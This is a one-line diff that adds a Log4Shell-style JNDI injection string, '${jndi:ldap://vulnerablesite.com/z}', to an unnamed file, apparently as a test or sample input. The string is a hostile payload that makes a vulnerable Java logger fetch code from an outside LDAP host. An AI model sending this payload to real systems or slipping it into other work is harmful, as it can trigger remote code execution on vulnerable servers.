@@ -1,0 +1,1 @@
+${jndi:ldap://vulnerablesite.com/z}
